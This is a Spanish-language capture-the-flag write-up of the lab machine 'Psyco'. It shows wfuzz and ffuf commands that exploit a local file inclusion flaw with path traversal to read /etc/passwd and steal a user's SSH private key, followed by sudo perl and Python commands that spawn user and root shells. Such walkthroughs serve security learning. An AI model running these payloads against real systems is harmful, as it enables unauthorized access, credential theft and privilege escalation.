# Máquina Psyco - Writeup

La máquina Psyco es un entorno Docker que expone un servidor HTTP en el puerto 80 y un servicio SSH en el puerto 22. La imagen del servidor HTTP contiene datos ocultos protegidos con contraseña, que intentamos extraer usando herramientas de esteganografía como stegseek, sin éxito, incluso con el diccionario rockyou.

El objetivo principal de esta máquina es explotar una vulnerabilidad **LFI (Local File Inclusion)** para acceder a archivos sensibles, y luego escalar privilegios mediante un script Python ejecutable con sudo.

## Enumeración

Comenzamos haciendo un escaneo de puertos, donde encontramos el puerto 80 con un servidor HTTP y el puerto 22 abierto para SSH. Descargamos la imagen del servidor HTTP para su análisis.

Aunque la imagen contiene datos ocultos con contraseña, no logramos extraerlos con stegseek ni con ataques por diccionario con rockyou.

## Identificación de LFI

Para identificar la vulnerabilidad LFI usamos la herramienta **wfuzz** con el siguiente comando:

```bash
wfuzz -c --hc=404 --hw 169 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt "http://172.17.0.2/index.php?FUZZ=../../../../../../../../../etc/passwd"
```

Esto nos permitió confirmar que el parámetro `vulnerables` nos daba acceso al archivo `/etc/passwd`. Al revisar este archivo vimos que existían tres usuarios principales:
- root
- vaxei  
- luisillo

## Fuzzing para encontrar archivos en home

Para descubrir qué archivos podíamos leer dentro de los directorios home de los usuarios, realizamos fuzzing con **ffuf**:

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.17.0.2/index.php?secret=../../../../../../../../../home/FUZZ" -mc all -fc 404
```

Los resultados fueron muy extensos, así que filtramos por tamaño y creamos un diccionario personalizado llamado `lfi-pysco.txt` para afinar la búsqueda:

```bash
ffuf -w lfi-pysco.txt -u "http://172.17.0.2/index.php?secret=../../../../../../../../../home/vaxei/FUZZ" -mc all -fc 404 -fs 2582
```

Así encontramos dos archivos importantes en el directorio home del usuario vaxei:
- `.ssh/id_rsa.pub`
- `.ssh/id_rsa`

El archivo `.ssh/id_rsa` es la clave privada SSH, que nos permitiría conectarnos al servidor como el usuario vaxei.

## Uso de la clave privada para acceder vía SSH

La clave privada encontrada estaba en un formato moderno OpenSSH que no podíamos usar directamente. Por lo tanto, tuvimos que extraer el contenido base64, eliminar saltos de línea y espacios, y formatearlo con 64 caracteres por línea usando:

```bash
cat ~/.ssh/id_rsa_exfiltrada | tr -d ' \n' | fold -w64
```

Después, añadimos las cabeceras correctas:

```
-----BEGIN OPENSSH PRIVATE KEY-----
[contenido base64]
-----END OPENSSH PRIVATE KEY-----
```

Guardamos el archivo como `id_rsa_fixed` y le dimos los permisos adecuados para poder usarlo con ssh.

Luego intentamos conectarnos con:

```bash
ssh -i ~/.ssh/id_rsa_fixed vaxei@172.17.0.2
```

Y logramos acceso como el usuario **vaxei**.

## Escalada de privilegios con sudo

Ya dentro, ejecutamos `sudo -l` para ver qué comandos podíamos ejecutar como sudo sin contraseña. El resultado nos indicó que podíamos ejecutar un shell como el usuario luisillo mediante:

```bash
sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'
```

Esto nos permitió cambiar al usuario **luisillo**.

## Intentos de obtener root

En el home de luisillo no había nada útil, y los intentos de usar las claves o códigos encontrados no funcionaron para obtener acceso root directamente.

Sin embargo, volvimos a ejecutar `sudo -l` y vimos que podíamos ejecutar el script Python `/opt/paw.py` como root.

Al ejecutar el script, este daba errores, pero descubrimos que podíamos crear un script Python para llamar a un subprocess que ejecutara un shell con privilegios elevados.

Finalmente, ejecutando:

```bash
sudo /usr/bin/python3 /opt/paw.py
```

el script llamaba a `/bin/bash -p`, dándonos una shell con permisos **root**.

## Flags

- El usuario **vaxei** se obtuvo usando la clave RSA privada filtrada y formateada.
- La flag **root** se consiguió accediendo a la shell con permisos root tras la ejecución del script Python con sudo.

## Lecciones aprendidas

- La vulnerabilidad **LFI** es muy potente para obtener archivos sensibles, en especial claves privadas SSH.
- Las claves privadas pueden requerir modificaciones para ser utilizables (formateo).
- Siempre es importante revisar qué comandos se pueden ejecutar con sudo para encontrar vías de escalada.
- Los scripts mal configurados que se pueden ejecutar con permisos elevados son un riesgo de seguridad grave.